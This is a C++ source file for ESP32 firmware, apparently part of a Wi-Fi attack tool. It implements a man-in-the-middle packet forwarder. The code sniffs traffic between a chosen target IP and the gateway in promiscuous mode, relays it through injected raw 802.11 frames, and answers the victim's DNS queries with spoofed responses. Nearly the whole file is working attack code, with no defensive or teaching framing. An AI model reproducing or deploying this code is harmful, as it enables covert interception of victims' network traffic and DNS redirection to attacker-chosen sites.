#include "packet_forwarder.h"
#include "config.h"
#include "wifi_manager.h"
#include "dns_spoof.h"
#include <esp_wifi.h>
#include <WiFi.h>

static bool s_running = false;
static uint32_t s_captured = 0;
static uint32_t s_forwarded = 0;
static uint32_t s_dropped = 0;
static uint32_t s_dns_spoofed = 0;

struct ieee80211_hdr_t {
    uint8_t  fc[2];
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

static uint8_t s_esp_mac[6];
static uint8_t s_bssid[6];

static void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_running) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *data = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 60 || len > 1500) return;
    if ((data[0] & 0x0C) != 0x08) return;

    bool is_qos = (data[0] & 0xF0) == 0x80;
    int hdr_len = sizeof(ieee80211_hdr_t) + (is_qos ? 2 : 0);
    if (len < hdr_len + 8 + 28) return;

    uint8_t* llc = data + hdr_len;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[6] != 0x08 || llc[7] != 0x00) return;

    uint8_t* ip = llc + 8;
    if (ip[0] != 0x45) return;

    uint8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, ip + 12, 4);
    memcpy(dst_ip, ip + 16, 4);

    bool match = false;
    bool target_to_gw = false;
    if (memcmp(src_ip, g_target_ip_bin, 4) == 0 && memcmp(dst_ip, g_gateway_ip_bin, 4) == 0) {
        match = true; target_to_gw = true;
    } else if (memcmp(src_ip, g_gateway_ip_bin, 4) == 0 && memcmp(dst_ip, g_target_ip_bin, 4) == 0) {
        match = true; target_to_gw = false;
    }
    if (!match) return;

    s_captured++;

    // DNS spoofing check
    if (dns_spoof_is_running() && ip[9] == 17) {
        uint8_t* udp = ip + 20;
        uint16_t udp_dport = (udp[2] << 8) | udp[3];
        if (udp_dport == 53) {
            uint8_t dns_resp[512];
            int dns_len = 0;
            if (dns_spoof_process(ip, len - hdr_len, dns_resp, &dns_len)) {
                s_dns_spoofed++;
                uint8_t frame[600];
                ieee80211_hdr_t* hdr = (ieee80211_hdr_t*)frame;
                hdr->fc[0] = 0x08; hdr->fc[1] = 0x01; hdr->duration = 0;
                memcpy(hdr->addr1, s_bssid, 6);
                memcpy(hdr->addr2, s_esp_mac, 6);
                memcpy(hdr->addr3, data + hdr_len + 6, 6);
                hdr->seq_ctrl = 0;
                uint8_t* out_llc = frame + sizeof(ieee80211_hdr_t);
                out_llc[0]=0xAA; out_llc[1]=0xAA; out_llc[2]=0x03;
                out_llc[3]=0; out_llc[4]=0; out_llc[5]=0;
                out_llc[6]=0x08; out_llc[7]=0x00;
                memcpy(out_llc + 8, dns_resp, dns_len);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(ieee80211_hdr_t) + 8 + dns_len, true);
                return;
            }
        }
    }

    // Forward packet
    const uint8_t* fwd_mac = target_to_gw ? g_gateway_mac_bin : g_target_mac_bin;
    uint8_t frame[1550];
    ieee80211_hdr_t* hdr = (ieee80211_hdr_t*)frame;
    hdr->fc[0] = 0x08; hdr->fc[1] = 0x01; hdr->duration = 0;
    memcpy(hdr->addr1, s_bssid, 6);
    memcpy(hdr->addr2, s_esp_mac, 6);
    memcpy(hdr->addr3, fwd_mac, 6);
    hdr->seq_ctrl = 0;
    memcpy(frame + sizeof(ieee80211_hdr_t), llc, len - hdr_len);

    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(ieee80211_hdr_t) + len - hdr_len, true) != ESP_OK) {
        s_dropped++;
    } else {
        s_forwarded++;
    }
}

void packet_forwarder_init() {
    s_running = false;
    s_captured = 0;
    s_forwarded = 0;
    s_dropped = 0;
    s_dns_spoofed = 0;
    wifi_manager_get_mac(s_esp_mac);
    memcpy(s_bssid, wifi_manager_get_bssid(), 6);
}

void packet_forwarder_start() {
    if (!config_validate() || !wifi_manager_is_connected()) {
        Serial.println("[Forward] Cannot start");
        return;
    }
    wifi_manager_get_mac(s_esp_mac);
    memcpy(s_bssid, wifi_manager_get_bssid(), 6);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    s_running = true;
    Serial.println("[Forward] Started");
}

void packet_forwarder_stop() {
    s_running = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("[Forward] Stopped");
}

bool packet_forwarder_is_running() {
    return s_running;
}

void packet_forwarder_get_stats(uint32_t& captured, uint32_t& forwarded, uint32_t& dropped, uint32_t& dns_spoofed) {
    captured = s_captured;
    forwarded = s_forwarded;
    dropped = s_dropped;
    dns_spoofed = s_dns_spoofed;
}

void packet_forwarder_print_debug() {
    Serial.printf("Cap=%u Fwd=%u Drop=%u DNS=%u\n", s_captured, s_forwarded, s_dropped, s_dns_spoofed);
}
